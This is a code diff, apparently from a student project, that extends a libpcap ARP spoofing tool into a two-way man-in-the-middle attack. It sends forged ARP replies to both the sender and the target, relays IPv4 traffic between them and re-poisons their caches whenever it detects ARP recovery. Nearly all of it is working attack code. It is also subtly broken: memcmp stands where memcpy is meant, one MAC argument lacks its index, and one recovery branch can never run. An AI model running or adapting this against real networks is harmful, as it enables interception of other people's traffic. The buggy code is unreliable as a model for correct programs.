@@ -138,6 +138,7 @@ int main(int argc, char* argv[])
     }
 
 // repeated phase
+// want to sender -> ( attacker ) -> target, target -> (attacker) -> sender (== MITM attack)
 // 3. arp spoofing: sender 에게 [ip = target ip / mac = attacker mac] 인 arp response 전송
     
     bool need_arp_spoof_reinfect = true; // check re-infect is needed
@@ -147,17 +148,29 @@ int main(int argc, char* argv[])
     while(true) {
         if(need_arp_spoof_reinfect){
             arp_packet arp_packet_deceive_sender[101];
+            arp_packet arp_packet_deceive_target[101];
             for(int now_pair = 0; now_pair < sender_target_pair_num; now_pair++){
                 arp_packet_deceive_sender[now_pair] = arp_reply_target_ip_with_attacker_mac(attacker_mac, sender_mac[now_pair], target_ip[now_pair], sender_ip[now_pair]);
+                arp_packet_deceive_target[now_pair] = arp_reply_target_ip_with_attacker_mac(attacker_mac, target_mac[now_pair], sender_ip[now_pair], target_ip[now_pair]);
             }
             for(int now_pair = 0; now_pair < sender_target_pair_num; now_pair++){
                 if(need_arp_spoof_reinfect_packet[now_pair] == true){ // only re-infect pair that needs re-inject
+                    bool flg = false;
+
                     if(pcap_sendpacket(handle, (uint8_t *)(& arp_packet_deceive_sender[now_pair]), ARP_PACKET_LEN) != 0){
-                        printf("[Error] pair %d 's Infect Packet Sending Failed.\n", now_pair + 1);
-                        need_arp_spoof_reinfect_packet[now_pair] = true;
+                        printf("[Error] pair %d 's Sender Infect Packet Sending Failed.\n", now_pair + 1);
+                        flg = true;
                     }
                     else{
-                        printf("[Success] pair %d 's Infect Packet Sent Successfully.\n", now_pair + 1);
+                        printf("[Success] pair %d 's Sender Infect Packet Sent Successfully.\n", now_pair + 1);
+                        flg = false;
+                    }
+                    if(pcap_sendpacket(handle, (uint8_t *)(& arp_packet_deceive_target[now_pair]), ARP_PACKET_LEN) != 0){
+                        printf("[Error] pair %d 's Target Infect Packet Sending Failed.\n", now_pair + 1);
+                        need_arp_spoof_reinfect_packet[now_pair] = flg;
+                    }
+                    else{
+                        printf("[Success] pair %d 's Target Infect Packet Sent Successfully.\n", now_pair + 1);
                         need_arp_spoof_reinfect_packet[now_pair] = false;
                     }
                 }
@@ -166,9 +179,10 @@ int main(int argc, char* argv[])
         }
         else{
 
-// 4. packet relay (sender -> attacker -> target)
-    // receive from sender / send to target
+// 4. packet relay (sender -> attacker -> target, target -> attacker -> sender)
+// in this stage, if packet means ARP request (ARP recovery) we can maintain by arp inject (again)
 
+    // receive from sender / send to target
             t1 = clock();
             while(true) {
                     // time check
@@ -182,43 +196,97 @@ int main(int argc, char* argv[])
                 if (res == 0) continue;
                 if (res == -1 || res == -2) break;
 
-                    // packet relay (attacker -> target)
+                bool flg = false;
                 for(int now_pair = 0; now_pair < sender_target_pair_num; now_pair++){
-                    if(need_arp_spoof_reinfect_packet[now_pair] == true) continue; // skip pair needs re-inject
-                    
-                        // check packet src == sender_ip & packet dst == target_ip (only mac addr is infected)
-                    if(memcmp((uint8_t *)packet + ARP_SOURCE_IP_ADDR, sender_ip[now_pair], IPv4_address_length) == 0){ // check sender ip addr
-                        if(memcmp((uint8_t *)packet + ARP_DESTINATION_IP_ADDR, target_ip[now_pair], IPv4_address_length) == 0){ // check target ip addr
-                            uint8_t * now_packet = (uint8_t *) packet;
-                                // while packet relaying, we only change mac addr
-                                    // src_mac = sender, dst_mac = attacker => src_mac = attacker, dst_mac = target
-                            memcmp(now_packet + ETHERNET_SOURCE_MAC_ADDR, attacker_mac, MAC_address_length);
-                            memcmp(now_packet + ETHERNET_DESTINATION_MAC_ADDR, target_mac, MAC_address_length);
-                            memcmp(now_packet + ARP_SOURCE_MAC_ADDR, attacker_mac, MAC_address_length);
-                            memcmp(now_packet + ARP_DESTINATION_MAC_ADDR, target_mac, MAC_address_length);
-                            pcap_sendpacket(handle, now_packet, header->caplen); // send packet attacker -> target
-                        }
+                    if(need_arp_spoof_reinfect_packet[now_pair] == true){ // if pair needs re-inject
+                        flg = true; break; 
                     }
 
                     uint8_t broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
                     uint8_t arp_request_mac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
 
-                    // if detect ARP Recovery, must re-inject
-                        // 1. recovery 1: target -> sender (broadcast) ask
-                    if(memcmp((uint8_t *)packet + ARP_SOURCE_IP_ADDR, target_ip[now_pair], IPv4_address_length) == 0){ // check target ip addr
-                        if(memcmp((uint8_t *)packet + ARP_DESTINATION_IP_ADDR, sender_ip[now_pair], IPv4_address_length) == 0){ // check sender ip addr
-                            if(memcmp((uint8_t *)packet + ETHERNET_DESTINATION_MAC_ADDR, broadcast, MAC_address_length) == 0){ // check broadcast
-                                if(ntohs(*((uint16_t *)(packet + ETHERTYPE))) == Ethertype_ARP){ // ARP packet 확인
-                                    if(ntohs(*((uint16_t *)(packet + ARP_OPCODE))) == ARP_operation_request){ // ARP request 확인
+                    // if detect ARP Recovery (sender <-> target arp request), must re-inject
+                    if(ntohs(*((uint16_t *)(packet + ETHERTYPE))) == Ethertype_ARP){ // ARP packet 확인
+                        if(ntohs(*((uint16_t *)(packet + ARP_OPCODE))) == ARP_operation_request){ // ARP request 확인
+
+                                // 1. recovery: target -> sender (broadcast) ask
+                            if(memcmp((uint8_t *)packet + ARP_SOURCE_IP_ADDR, target_ip[now_pair], IPv4_address_length) == 0){ // check target ip addr
+                                if(memcmp((uint8_t *)packet + ARP_DESTINATION_IP_ADDR, sender_ip[now_pair], IPv4_address_length) == 0){ // check sender ip addr
+                                    if(memcmp((uint8_t *)packet + ETHERNET_DESTINATION_MAC_ADDR, broadcast, MAC_address_length) == 0){ // check broadcast
                                         need_arp_spoof_reinfect = true;
                                         need_arp_spoof_reinfect_packet[now_pair] = true;
-                                        continue;
+                                        break;
                                     }
                                 }
+                            }
+                                // 2. recovery: target -> sender (unicast) ask
+                            else if(memcmp((uint8_t *)packet + ARP_SOURCE_IP_ADDR, target_ip[now_pair], IPv4_address_length) == 0){ // check target ip addr
+                                if(memcmp((uint8_t *)packet + ARP_DESTINATION_IP_ADDR, sender_ip[now_pair], IPv4_address_length) == 0){ // check sender ip addr
+                                    if(memcmp((uint8_t *)packet + ETHERNET_DESTINATION_MAC_ADDR, sender_mac[now_pair], MAC_address_length) == 0){ // check broadcast
+                                        need_arp_spoof_reinfect = true;
+                                        need_arp_spoof_reinfect_packet[now_pair] = true;
+                                        break;
+                                    }
+                                }
+                            }
+                                // 3. recovery: sender -> target (broadcast) ask
+                            else if(memcmp((uint8_t *)packet + ARP_SOURCE_IP_ADDR, sender_ip[now_pair], IPv4_address_length) == 0){ // check target ip addr
+                                if(memcmp((uint8_t *)packet + ARP_DESTINATION_IP_ADDR, target_ip[now_pair], IPv4_address_length) == 0){ // check sender ip addr
+                                    if(memcmp((uint8_t *)packet + ETHERNET_DESTINATION_MAC_ADDR, broadcast, MAC_address_length) == 0){ // check broadcast
+                                        need_arp_spoof_reinfect = true;
+                                        need_arp_spoof_reinfect_packet[now_pair] = true;
+                                        break;
+                                    }
+                                }
+                            }
+                                // 4. recovery: sender -> target (unicast) ask
+                            else if(memcmp((uint8_t *)packet + ARP_SOURCE_IP_ADDR, target_ip[now_pair], IPv4_address_length) == 0){ // check target ip addr
+                                if(memcmp((uint8_t *)packet + ARP_DESTINATION_IP_ADDR, sender_ip[now_pair], IPv4_address_length) == 0){ // check sender ip addr
+                                    if(memcmp((uint8_t *)packet + ETHERNET_DESTINATION_MAC_ADDR, target_mac[now_pair], MAC_address_length) == 0){ // check broadcast
+                                        need_arp_spoof_reinfect = true;
+                                        need_arp_spoof_reinfect_packet[now_pair] = true;
+                                        break;
+                                    }
+                                }
+                            }
+
+                            else {} // another pair (using this gateway), not included in this spoofing
+                        }
+                    }
+                        
+                    // packet relay (In Layer 3)
+                        // sender -> attacker -> target
+                        // check packet src == sender_ip & packet dst == target_ip
+                        
+                    if(ntohs(*((uint16_t *)(packet + ETHERTYPE))) == Ethertype_IPv4){
+                        if(memcmp((uint8_t *)packet + IPv4_SOURCE_IP_ADDR, sender_ip[now_pair], IPv4_address_length) == 0){ // check sender ip addr
+                            if(memcmp((uint8_t *)packet + IPv4_DESTINATION_IP_ADDR, target_ip[now_pair], IPv4_address_length) == 0){ // check target ip addr
+                                uint8_t * now_packet = (uint8_t *) packet;
+                                    // while packet relaying, we only change mac addr
+                                        // src_mac = sender, dst_mac = attacker => src_mac = attacker, dst_mac = target
+                                memcmp(now_packet + ETHERNET_SOURCE_MAC_ADDR, attacker_mac, MAC_address_length);
+                                memcmp(now_packet + ETHERNET_DESTINATION_MAC_ADDR, target_mac, MAC_address_length);
+                                pcap_sendpacket(handle, now_packet, header->caplen); // send packet attacker -> target
+                                break;
+                            }
+                        }
+                            // target -> attacker -> sender
+                            // check packet src == target_ip & packet dst == sender_ip
+                        if(memcmp((uint8_t *)packet + IPv4_SOURCE_IP_ADDR, target_ip[now_pair], IPv4_address_length) == 0){ // check sender ip addr
+                            if(memcmp((uint8_t *)packet + IPv4_DESTINATION_IP_ADDR, sender_ip[now_pair], IPv4_address_length) == 0){ // check target ip addr
+                                uint8_t * now_packet = (uint8_t *) packet;
+                                    // while packet relaying, we only change mac addr
+                                        // src_mac = target, dst_mac = attacker => src_mac = attacker, dst_mac = sender
+                                memcmp(now_packet + ETHERNET_SOURCE_MAC_ADDR, attacker_mac, MAC_address_length);
+                                memcmp(now_packet + ETHERNET_DESTINATION_MAC_ADDR, sender_mac, MAC_address_length);
+                                pcap_sendpacket(handle, now_packet, header->caplen); // send packet attacker -> target
+                                break;
                             }
                         }
                     }
                 }
+
+                if(flg) need_arp_spoof_reinfect = true;
                 if(need_arp_spoof_reinfect) break;
             }
         }
